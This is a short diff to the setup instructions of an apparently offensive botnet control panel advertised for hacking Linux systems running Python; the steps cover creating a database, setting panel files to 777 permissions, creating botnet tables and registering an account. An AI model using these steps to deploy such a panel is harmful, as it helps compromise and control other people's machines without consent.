@@ -34,7 +34,7 @@ You Can use it to hack any Linux system with python on it
 4. Go to PHPMyAdmin
 5. Create a database with any name you want
 6. Change the data in config.php
-7. Change blacknet files and folders permission to 777
+7. Change files and folders permission to 777 [connection.php,sendcommand.php,receive.php,Clients Folder]
 8. Go to db.php to create the botnet tables automatically
 9. Go to register.php then create a new account
 10. Enter you network and enjoy hacking
